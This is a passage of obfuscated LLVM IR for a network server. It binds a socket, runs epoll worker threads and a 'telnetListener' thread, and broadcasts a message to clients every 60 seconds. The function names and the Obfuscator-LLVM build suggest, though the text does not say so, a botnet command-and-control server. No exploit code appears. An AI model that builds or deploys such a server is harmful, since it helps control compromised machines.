; <label>:42:                                     ; preds = %37
  %43 = load volatile i32, i32* @listenFD, align 4
  %44 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i64 0, i32 1
  %45 = bitcast %union.epoll_data* %44 to i32*
  store i32 %43, i32* %45, align 4
  %46 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i64 0, i32 0
  store i32 -2147483647, i32* %46, align 4
  %47 = load volatile i32, i32* @epollFD, align 4
  %48 = load volatile i32, i32* @listenFD, align 4
  %49 = call i32 @epoll_ctl(i32 %47, i32 1, i32 %48, %struct.epoll_event* nonnull %4) #10
  %50 = icmp eq i32 %49, -1
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %42
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0)) #12
  call void @abort() #13
  unreachable

; <label>:52:                                     ; preds = %42
  %53 = add nsw i32 %17, 2
  %54 = zext i32 %53 to i64
  %55 = alloca i64, i64 %54, align 16
  %56 = icmp eq i32 %17, 0
  br i1 %56, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %52
  %57 = sext i32 %17 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %57, %.lr.ph.preheader ], [ %indvars.iv.next, %.lr.ph ]
  %indvars.iv.next = add nsw i64 %indvars.iv, -1
  %58 = getelementptr inbounds i64, i64* %55, i64 %indvars.iv
  %59 = call i32 @pthread_create(i64* %58, %union.pthread_attr_t* null, i8* (i8*)* nonnull @epollEventLoop, i8* null) #10
  %60 = trunc i64 %indvars.iv.next to i32
  %61 = icmp eq i32 %60, 0
  br i1 %61, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %52
  %62 = sext i32 %14 to i64
  %63 = inttoptr i64 %62 to i8*
  %64 = call i32 @pthread_create(i64* nonnull %55, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @telnetListener to i8* (i8*)*), i8* %63) #10
  br label %65

; <label>:65:                                     ; preds = %65, %._crit_edge
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 undef, i8* undef)
  %66 = call i32 @sleep(i32 60) #10
  br label %65
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #8

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @create_and_bind(i8*) unnamed_addr #0 {
  %2 = alloca %struct.addrinfo, align 8
  %3 = alloca %struct.addrinfo*, align 8
  %4 = alloca i32, align 4
  %5 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %2, i64 0, i32 2
  %6 = bitcast %struct.addrinfo* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %6, i8 0, i64 48, i32 8, i1 false)
  store i32 1, i32* %5, align 8
  %7 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %2, i64 0, i32 0
  store i32 1, i32* %7, align 8
  %8 = call i32 @getaddrinfo(i8* null, i8* %0, %struct.addrinfo* nonnull %2, %struct.addrinfo** nonnull %3) #10
  %9 = icmp eq i32 %8, 0
  br i1 %9, label %.preheader, label %12

.preheader:                                       ; preds = %1
  %.01719 = load %struct.addrinfo*, %struct.addrinfo** %3, align 8
  %10 = icmp eq %struct.addrinfo* %.01719, null
  br i1 %10, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %.preheader
  %11 = bitcast i32* %4 to i8*
  br label %16

; <label>:12:                                     ; preds = %1
  %13 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %14 = call i8* @gai_strerror(i32 %8) #10
  %15 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %13, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.220, i64 0, i64 0), i8* %14) #12
  br label %45

; <label>:16:                                     ; preds = %.lr.ph, %38
  %.01720 = phi %struct.addrinfo* [ %.01719, %.lr.ph ], [ %.017, %38 ]
  %17 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 1
  %18 = load i32, i32* %17, align 4
  %19 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 2
  %20 = load i32, i32* %19, align 8
  %21 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 3
  %22 = load i32, i32* %21, align 4
  %23 = call i32 @socket(i32 %18, i32 %20, i32 %22) #10
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %38, label %25

; <label>:25:                                     ; preds = %16
  store i32 1, i32* %4, align 4
  %26 = call i32 @setsockopt(i32 %23, i32 1, i32 2, i8* nonnull %11, i32 4) #10
  %27 = icmp eq i32 %26, -1
  br i1 %27, label %28, label %29

; <label>:28:                                     ; preds = %25
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.221, i64 0, i64 0)) #12
  br label %29

; <label>:29:                                     ; preds = %28, %25
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 5
  %31 = load %struct.sockaddr*, %struct.sockaddr** %30, align 8
  %32 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 4
  %33 = load i32, i32* %32, align 8
  %34 = call i32 @bind(i32 %23, %struct.sockaddr* %31, i32 %33) #10
  %35 = icmp eq i32 %34, 0
  br i1 %35, label %43, label %36

; <label>:36:                                     ; preds = %29
  %37 = call i32 @close(i32 %23) #10
  br label %38

; <label>:38:                                     ; preds = %16, %36
  %39 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 7
  %.017 = load %struct.addrinfo*, %struct.addrinfo** %39, align 8
  %40 = icmp eq %struct.addrinfo* %.017, null
  br i1 %40, label %._crit_edge.loopexit, label %16

._crit_edge.loopexit:                             ; preds = %38
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %41 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %42 = call i64 @fwrite(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.222, i64 0, i64 0), i64 15, i64 1, %struct._IO_FILE* %41) #12
  br label %45

; <label>:43:                                     ; preds = %29
  %44 = load %struct.addrinfo*, %struct.addrinfo** %3, align 8
  call void @freeaddrinfo(%struct.addrinfo* %44) #10
  br label %45

; <label>:45:                                     ; preds = %43, %._crit_edge, %12
  %.018 = phi i32 [ -1, %12 ], [ -1, %._crit_edge ], [ %23, %43 ]
  ret i32 %.018
}

; Function Attrs: noreturn nounwind
declare void @abort() local_unnamed_addr #8

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) local_unnamed_addr #3

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) local_unnamed_addr #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) local_unnamed_addr #3

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #9

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: nounwind
declare i32 @puts(i8* nocapture readonly) #10

; Function Attrs: nounwind
declare i64 @fwrite(i8* nocapture, i64, i64, %struct._IO_FILE* nocapture) #10

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind }
attributes #11 = { nounwind readnone }
attributes #12 = { cold }
attributes #13 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{!2}
!2 = distinct !{!2, !3}
!3 = distinct !{!3, !"LVerDomain"}
!4 = !{!5}
!5 = distinct !{!5, !3}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.unroll.disable"}
!8 = distinct !{!8, !9, !10}
!9 = !{!"llvm.loop.vectorize.width", i32 1}
!10 = !{!"llvm.loop.interleave.count", i32 1}
!11 = distinct !{!11, !9, !10}
!12 = distinct !{!12, !9, !10}
